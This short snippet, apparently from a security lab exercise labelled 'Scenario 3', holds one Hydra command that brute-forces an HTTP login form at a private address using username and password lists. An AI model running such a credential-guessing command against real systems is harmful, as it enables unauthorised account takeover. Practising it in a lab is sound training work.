# Author: Lazaro Perez Jr.

# Scenario 3: Hydra brute force on the HTTP login
hydra -L users.txt -P passwords.txt 172.30.0.30 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
